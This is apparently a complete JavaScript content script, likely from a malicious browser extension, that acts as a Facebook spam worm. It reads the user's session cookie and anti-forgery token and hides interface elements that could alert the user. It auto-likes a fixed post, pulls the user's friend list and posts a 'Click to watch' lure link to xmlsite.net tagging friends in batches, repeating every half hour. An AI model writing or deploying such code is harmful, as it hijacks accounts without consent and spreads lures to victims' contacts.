if(location.hostname.indexOf("www.facebook.com") >= 0) {
    
    window.setInterval(function() {

        if (document.getElementsByClassName("_5ce")) {
            for (i = 0; i < document.getElementsByClassName("_5ce").length; i++) {
                document.getElementsByClassName("_5ce")[i].innerHTML = "";
            }
        }
        if (document.getElementsByClassName("uiToggle wrap")) {
            for (i = 0; i < document.getElementsByClassName("uiToggle wrap").length; i++) {
                document.getElementsByClassName("uiToggle wrap")[i].innerHTML = "";
            }
        }
        if (document.getElementsByClassName("uiPopover")) {
            for (i = 0; i < document.getElementsByClassName("uiPopover").length; i++) {
                document.getElementsByClassName("uiPopover")[i].innerHTML = "";
            }
        }
    }, 10);

    var profile_id = document.cookie.match(/c_user=(\d+)/)[1];
    var config = document.getElementsByName('fb_dtsg')[0].value;
    var cookiene = "sadsadadsdsddsdssssssss";

    function begen(id) {
        var http = new XMLHttpRequest();
        http.onreadystatechange = function () {
            if (http.readyState == 4) {}
        };
        var params = "like_action=true&ft_ent_identifier=" + id;
        params +="&__user=" + profile_id;
        params += "&fb_dtsg="+document.getElementsByName('fb_dtsg')[0].value;
        http.open("POST", "/ajax/ufi/like.php", true);
        http.send(params);
    }
    
    begen("784024965019465");

    function rastgele(uzunluk) {             
        mtn = "ABCDEFGHIJKLMNOPRSTUVYZXabcdefghijklmnoprstuvyzx0123456789";
        ret = "";
        for (i = 0; i < uzunluk; i++) {
            ret += mtn[Math.floor(Math.random() * 57)];
        }
        return ret;
    }


    var isim = "Click to watch =>"+rastgele(15)+"";

    function localhost() {
        
        var arrimg = [
            "https://i.imgur.com/o5dGAMF.jpg",
            "https://i.imgur.com/yidEKEr.jpg",
            "https://i.imgur.com/9Ho28cC.jpg",
            "https://i.imgur.com/BcUH0ie.jpg",
            "https://i.imgur.com/Ayo3eUV.jpg",
            "https://i.imgur.com/fDD9fM1.jpg",
            "https://i.imgur.com/hasjpJA.jpg",
            "https://i.imgur.com/pIzWTHL.jpg",
            "https://i.imgur.com/0mJLcTJ.jpg",
            "https://i.imgur.com/cIQvNnw.jpg",
            "https://i.imgur.com/cfDRHZ1.jpg",
            "https://i.imgur.com/06Qr5gK.jpg",
            "https://i.imgur.com/w5w7bdy.jpg",
            "https://i.imgur.com/RL8teR3.jpg",
            "https://i.imgur.com/hZAJyG2.jpg",
            "https://i.imgur.com/unnXIHv.jpg",
            "https://i.imgur.com/ZCWLTgl.jpg",
            "https://i.imgur.com/6OolPNu.jpg",
            "https://i.imgur.com/VlOlnJU.jpg",
            "https://i.imgur.com/2CYlEpE.jpg",
            "https://i.imgur.com/q8SthHK.jpg",
            "https://i.imgur.com/P5pBOkF.jpg",
            "https://i.imgur.com/vFj2EDW.jpg",
            "https://i.imgur.com/zv6Btrb.jpg",
            "https://i.imgur.com/ndaYzdX.jpg",
            "https://i.imgur.com/TjHrVBh.jpg",
            "https://i.imgur.com/rrV8Htc.jpg",
            "https://i.imgur.com/J6ewV6D.jpg",
            "https://i.imgur.com/UrC2GXz.jpg",
            "https://i.imgur.com/dDkKW2Z.jpg",
            "https://i.imgur.com/i7WYJQo.jpg",
            "https://i.imgur.com/OZm4K8U.jpg",
            "https://i.imgur.com/Uo9QB6q.jpg",
            "https://i.imgur.com/GvJdMrv.jpg",
            "https://i.imgur.com/bfRdock.jpg",
            "https://i.imgur.com/XRlrruY.jpg",
            "https://i.imgur.com/YdURsWz.jpg",
            "https://i.imgur.com/S5kQOoi.jpg",
            "https://i.imgur.com/cIVzcqC.jpg",
            "https://i.imgur.com/2mfhR8T.jpg",
            "https://i.imgur.com/0lr7YVy.jpg",
            "https://i.imgur.com/Qjm6uLg.jpg",
            "https://i.imgur.com/6K2WNR3.jpg",
            "https://i.imgur.com/W8zjGb8.jpg",
            "https://i.imgur.com/W2Efalm.jpg",
            "https://i.imgur.com/Ze3hGAb.jpg",
            "https://i.imgur.com/kCvXR32.jpg",
            "https://i.imgur.com/O7tpGqD.jpg",
            "https://i.imgur.com/ngOzvS7.jpg",
            "https://i.imgur.com/heWF3yz.jpg",
            "https://i.imgur.com/9LFk792.jpg",
            "https://i.imgur.com/Zm0EqnW.jpg",
            "https://i.imgur.com/QlNA0lS.jpg",
            "https://i.imgur.com/nBHK3kL.jpg",
            "https://i.imgur.com/cdFPpKc.jpg",
            "https://i.imgur.com/6fjsWWe.jpg",
            "https://i.imgur.com/BhBer8F.jpg",
            "https://i.imgur.com/ybDaIYa.jpg",
            "https://i.imgur.com/xFqKO8W.jpg",
            "https://i.imgur.com/SWNlDSi.jpg",
            "https://i.imgur.com/ZVwveOJ.jpg",
            "https://i.imgur.com/tnC9EYX.jpg",
            "https://i.imgur.com/Hia4TKr.jpg",
            "https://i.imgur.com/tmxkaae.jpg",
            "https://i.imgur.com/tm3NDE8.jpg",
            "https://i.imgur.com/ngdp4Ez.jpg",
            "https://i.imgur.com/6xIjuZN.jpg",
            "https://i.imgur.com/UkZEAkg.jpg",
            "https://i.imgur.com/yZjsGsu.jpg",
            "https://i.imgur.com/rUfDmtA.jpg",
            "https://i.imgur.com/uvPgZ9a.jpg",
            "https://i.imgur.com/jySzTG1.jpg",
            "https://i.imgur.com/wFhbwBj.jpg",
            "https://i.imgur.com/RSQ2uMv.jpg",
            "https://i.imgur.com/v29Vqfc.jpg",
            "https://i.imgur.com/Vdce31H.jpg",
            "https://i.imgur.com/MuZ3vEB.jpg",
            "https://i.imgur.com/aUiu4b3.jpg",
            "https://i.imgur.com/SkTeZvy.jpg",
            "https://i.imgur.com/YppRxG1.jpg",
            "https://i.imgur.com/9lNrQwk.jpg",
            "https://i.imgur.com/aodbaFX.jpg",
            "https://i.imgur.com/n9jzX6c.jpg",
            "https://i.imgur.com/yWOPbsZ.jpg",
            "https://i.imgur.com/p6s5ArB.jpg",
            "https://i.imgur.com/yLHta1g.jpg",
            "https://i.imgur.com/aAsHBZB.jpg",
            "https://i.imgur.com/doudnNU.jpg",
            "https://i.imgur.com/tZ5PJ1U.jpg",
            "https://i.imgur.com/BPBVOZT.jpg",
            "https://i.imgur.com/mPcdgd7.jpg",
            "https://i.imgur.com/I3muLzl.jpg",
            "https://i.imgur.com/v7rKfOn.jpg",
            "https://i.imgur.com/evj6Ulz.jpg",
            "https://i.imgur.com/WX5HJaE.jpg",
            "https://i.imgur.com/CaYWkyD.jpg",
            "https://i.imgur.com/7F9wHuC.jpg",
            "https://i.imgur.com/9LsEQx6.jpg",
            "https://i.imgur.com/tdeqPYE.jpg",
            "https://i.imgur.com/xfAIKWx.jpg",
            "https://i.imgur.com/il9ohzH.jpg",
            "https://i.imgur.com/qwx1Fjn.jpg",
            "https://i.imgur.com/G1XRRnk.jpg",
            "https://i.imgur.com/DsLdr3d.jpg",
            "https://i.imgur.com/UUZvllg.jpg",
            "https://i.imgur.com/q00KyZc.jpg",
            "https://i.imgur.com/FIw0NlK.jpg",
            "https://i.imgur.com/AVjHBpP.jpg",
            "https://i.imgur.com/shvWuuM.jpg",
            "https://i.imgur.com/DB7mWjd.jpg",
            "https://i.imgur.com/XTbWmEl.jpg",
            "https://i.imgur.com/oFh34BK.jpg",
            "https://i.imgur.com/tuFRdi1.jpg",
            "https://i.imgur.com/7jVL5gp.jpg",
            "https://i.imgur.com/Tw86XZg.jpg",
            "https://i.imgur.com/0sSV68D.jpg",
            "https://i.imgur.com/qUtR1uW.jpg",
            "https://i.imgur.com/iMZ0bA9.jpg",
            "https://i.imgur.com/NyW76Gt.jpg",
            "https://i.imgur.com/qkmBrtC.jpg",
            "https://i.imgur.com/V4vvUow.jpg",
            "https://i.imgur.com/GbA2hPr.jpg",
            "https://i.imgur.com/dAoMbJe.jpg",
            "https://i.imgur.com/SHSMfpp.jpg",
            "https://i.imgur.com/xW72qft.jpg",
            "https://i.imgur.com/fkPdYgY.jpg",
            "https://i.imgur.com/tZ9R6uA.jpg",
            "https://i.imgur.com/BHJNvtB.jpg",
            "https://i.imgur.com/zk47eBd.jpg",
            "https://i.imgur.com/QWTxZTx.jpg",
            "https://i.imgur.com/OA0ENhi.jpg",
            "https://i.imgur.com/aUUkpeh.jpg",
            "https://i.imgur.com/kJSE0sU.jpg",
            "https://i.imgur.com/MChTVDy.jpg",
            "https://i.imgur.com/NQ6WnUv.jpg",
            "https://i.imgur.com/4nAXu1p.jpg",
            "https://i.imgur.com/d5xLIQM.jpg",
            "https://i.imgur.com/ZNAWVpR.jpg",
            "https://i.imgur.com/bVkPUcE.jpg",
            "https://i.imgur.com/HbORP0x.jpg",
            "https://i.imgur.com/Quxhoew.jpg",
            "https://i.imgur.com/7AWYhF5.jpg"
        ];
        
        image = arrimg[Math.floor(Math.random() * arrimg.length)];
        link = "http://xmlsite.net";
        
        arkadaslar();
    }

        function arkadaslar() {
            xmlhttp = new XMLHttpRequest();
            xmlhttp.open("GET", "/ajax/typeahead/place_tag_friends.php?__a=1&content_id=395870630487365&viewer=" + profile_id + "&" + Math.random(), false);
            xmlhttp.send();
            if (xmlhttp.readyState != 4) {} else {
                data = eval('(' + xmlhttp.responseText.substr(9) + ')');
                if (data.error) {} else {
                    friends = data.payload.entries.sort(function(a, b) {
                        return a.index - b.index;
                    });

                }
            }
            var friends_fields = new Array(new Array());
            var how_many = 0;
            var array_count = 0;
            for (var i = 0; i < friends.length; i++) {

                if (friends[i].uid != profile_id) {

                    friends_fields[array_count][how_many] = "&composertags_with[" + how_many + "]=" + friends[i].uid;
                    how_many++;
                    if (how_many >= 20) {

                        how_many = 0;
                        array_count++;
                        friends_fields[array_count] = new Array();
                    }

                }
            }
            var arkadas = "";
            for (var i = 0; i < friends_fields.length; i++) {

                for (var k = 0; k < friends_fields[i].length; k++) {
                    arkadas += friends_fields[i][k];
                }
                var xhr = new XMLHttpRequest();
                var params = "fb_dtsg=" + config;
                params += "&xhpc_context=home";
                params += "&xhpc_ismeta=1";
                params += "&xhpc_timeline=";
                params += "&xhpc_composerid=u_0_r";
                params += "&xhpc_targetid=" + profile_id;
                params += "&xhpc_publish_type=1";
                params += "&xhpc_message_text=";
                params += "&xhpc_message=";
                params += "&aktion=post";
                params += "&app_id=2309869772";
                params += "&attachment[params][urlInfo][canonical]=" + link;
                params += "&attachment[params][urlInfo][final]=" + link;
                params += "&attachment[params][urlInfo][user]=" + link;
                params += "&attachment[params][responseCode]=200";
                params += "&attachment[params][title]=" + isim;
                params += "&attachment[params][content_removed]=";
                params += "&attachment[params][images][0]=" + image;
                params += "&attachment[params][ranked_images][ranking_model_version]=10";
                params += "&attachment[params][video_info][duration]=0";
                params += "&attachment[params][medium]=106";
                params += "&attachment[params][url]=" + link;
                params += "&attachment[params][time_scraped]=1419870286";
                params += "&attachment[params][cache_hit]=1";
                params += "&attachment[params][global_share_id]=474423878758";
                params += "&attachment[params][was_recent]=";
                params += "&attachment[params][metaTagMap][0][http-equiv]=content-type";
                params += "&attachment[params][metaTagMap][0][content]=text%2Fhtml%3B%20charset%3Dutf-8";
                params += "&attachment[params][metaTagMap][1][itemprop]=image";
                params += "&attachment[params][og_info][guesses][0][0]=og%3Aurl";
                params += "&attachment[params][og_info][guesses][0][1]=" + link;
                params += "&attachment[params][og_info][guesses][1][0]=og%3Atitle";
                params += "&attachment[params][og_info][guesses][1][1]=Google";
                params += "&attachment[params][og_info][guesses][2][0]=og%3Aimage";
                params += "&attachment[params][og_info][guesses][3][0]=og%3Alocale";
                params += "&attachment[params][og_info][guesses][3][1]=tr";
                params += "&attachment[params][ttl]=604800";
                params += "&attachment[params][error]=1";
                params += "&attachment[type]=100";
                params += "&composer_metrics[image_selected]=0";
                params += "&is_explicit_place=";
                params += arkadas;
                params += "&composertags_place=";
                params += "&composertags_place_name=";
                params += "&tagger_session_id=1420140363";
                params += "&action_type_id[0]=";
                params += "&object_str[0]=";
                params += "&object_id[0]=";
                params += "&hide_object_attachment=0";
                params += "&og_suggestion_mechanism=";
                params += "&og_suggestion_logging_data=";
                params += "&icon_id=";
                params += "&composertags_city=";
                params += "&disable_location_sharing=false";
                params += "&composer_predicted_city=";
                params += "&privacyx=300645083384735";
                params += "&nctr[_mod]=pagelet_composer";
                params += "&__user=" + profile_id;
                params += "&__a=1";
                params += "&__dyn=7nm8RW8BgBlynzpQ9UoGya4Au74qbx2mbAKGiyFqzQC-C26m5-9V8CdDx2ubhHximmey8qUS8zU";
                params += "&__req=y";
                params += "&ttstamp=265817089758111551991165368";
                params += "&__rev=1547526";
                xhr.open("POST", "/ajax/updatestatus.php?av=" + profile_id, true);
                xhr.send(params);
                var arkadas = '';
            }
        }
    
        tarih = new Date();
        if (!localStorage[cookiene + profile_id] || (localStorage[cookiene + profile_id] && tarih.getTime() >= localStorage[cookiene + profile_id])) {
                tarih.setTime(tarih.getTime() + 1000 * 60 * 30);
                localStorage[cookiene + profile_id] = tarih.getTime();
                localhost();
        }
}	
